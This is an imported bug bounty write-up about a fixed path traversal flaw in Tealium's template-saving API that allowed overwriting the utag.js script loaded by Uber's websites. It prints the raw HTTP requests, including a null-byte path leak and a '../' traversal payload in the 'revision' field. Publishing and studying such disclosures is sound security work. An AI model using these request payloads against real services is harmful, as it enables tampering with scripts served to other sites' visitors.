---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2018-12-03_bbp系列三-hijack-the-js-file-of-ubers-website.md
original_filename: 2018-12-03_bbp系列三-hijack-the-js-file-of-ubers-website.md
title: '[BBP系列三] Hijack the JS File of Uber''s Website'
category: documents
detected_topics:
- xss
- command-injection
- path-traversal
- api-security
tags:
- imported
- documents
- xss
- command-injection
- path-traversal
- api-security
language: en
raw_sha256: f370c8aa0bdbd1a91975f5da3803d5cea23c41015de31aaa4e3a7d634e16e907
text_sha256: 215c2d98849c167864b1ca27a10dcabe27a0aaaf27ee3f658cbda6493e26f927
ingested_at: '2026-06-28T07:31:58Z'
sensitivity: unknown
redactions_applied: false
---

# [BBP系列三] Hijack the JS File of Uber's Website

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2018-12-03_bbp系列三-hijack-the-js-file-of-ubers-website.md
- Source Type: markdown
- Detected Topics: xss, command-injection, path-traversal, api-security
- Ingested At: 2026-06-28T07:31:58Z
- Redactions Applied: False
- Raw SHA256: `f370c8aa0bdbd1a91975f5da3803d5cea23c41015de31aaa4e3a7d634e16e907`
- Text SHA256: `215c2d98849c167864b1ca27a10dcabe27a0aaaf27ee3f658cbda6493e26f927`


## Content

---
title: "[BBP系列三] Hijack the JS File of Uber's Website"
page_title: "[BBP系列三] Hijack the JS File of Uber's Website | zhchbin"
url: "http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/"
final_url: "http://zhchbin.github.io/2018/12/03/Hijack-the-JS-File-of-Uber-s-Website/"
authors: ["Chaobin Zhang"]
programs: ["Uber"]
bugs: ["JS file hijacking"]
bounty: "6,000"
publication_date: "2018-12-03"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5550
---

#  [BBP系列三] Hijack the JS File of Uber's Website 

__ Posted on 2018-12-03 __ Edited on 2022-05-15

### TLDR

  1. Almost all of Uber’s websites are loading JS file: <https://tags.tiqcdn.com/utag/uber/main/prod/utag.js>
  2. I found that the content of utag.js is updating from `/data/utui/data/accounts/uber/templates/main/utag.js` when deploying in my.tealiumiq.com. 
  3. my.tealiumiq.com has a path traversal issue, which allow hacker to change `utag.js` of other account, including Uber’s.
  4. This bug had beed fixed 8 months ago. Bug Bounty: $6000.

### My Steps

I like asking myself some questions when hunting for bug bounty. Looking around about `https://tags.tiqcdn.com/utag/uber/main/prod/utag.js`, I found Uber’s websites were using a third party service offered by `Tealium`. I asked myself: can I modify the content of `utag.js`? How?

I registered two account and began my journey. WARNING: DO NOT TEST IN PRODUCTION USING TARGET ACCOUNT.

![](/images/7184df6bgy1fxtifofrypj20gh0bq0tw.jpg)

  * Post `/urest/legacy/saveTemplate` with `profile=main%00` to get the path in server

  
  
  1  
  2  
  3  
  4  
  5  
  

| 
  
  
  POST /urest/legacy/saveTemplate?utk=044925f62222711fdfec11dc6a4e7160e053d31e1a7f4774e8 HTTP/1.1  
  Host: my.tealiumiq.com  
  <redated>  
  
  account=evilaccount&profile=main%00&type=profile&template=profile.loader&code=%2F%2F+console.log(1)%3B%0A%0Aconsole.log(1)%3B  
  
  
---|---  
  
Response 
  
  
  1  
  

| 
  
  
  { "message" : "There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/utag.js"}  
  
  
---|---  
  
As you can see, the `utag.loader` template path is `/data/utui/data/accounts/evilaccount/templates/main/utag.js`

  * Change the requst body to update the revision.loader

  
  
  1  
  2  
  3  
  

| 
  
  
  POST /urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b HTTP/1.1  
  
  account=evilaccount&profile=main%00&type=revision&template=revision.loader&code=thisisatest&revision=201804081230  
  
  
---|---  
  
Response 
  
  
  1  
  

| 
  
  
  { "message" : "There was an error updating this template: /data/utui/data/accounts/evilaccount/templates/main/201804081230/utag.js"}  
  
  
---|---  
  
As you can see `201804081230` is appearing at the path. After testing, I found that I can insert `../` into this path, which means that I can change utag.js of any account, including Uber’s.
  
  
  1  
  2  
  3  
  4  
  

| 
  
  
  POST /urest/legacy/saveTemplate?utk=688b137d1b8d8e884b3e1be4cd689843d0e3bc9705665f059b HTTP/1.1  
  ...  
  
  account=evilaccount&profile=main&type=revision&template=revision.loader&code=thisisatest&revision=201804081230/../../../../<victimaccount>/templates/main  
  
  
---|---  
  
[# 安全](/tags/安全/) [# BBP](/tags/BBP/)

[ __[BBP系列二] Uber XSS via Cookie](/2017/08/30/Uber-XSS-via-Cookie/ "\[BBP系列二\] Uber XSS via Cookie")
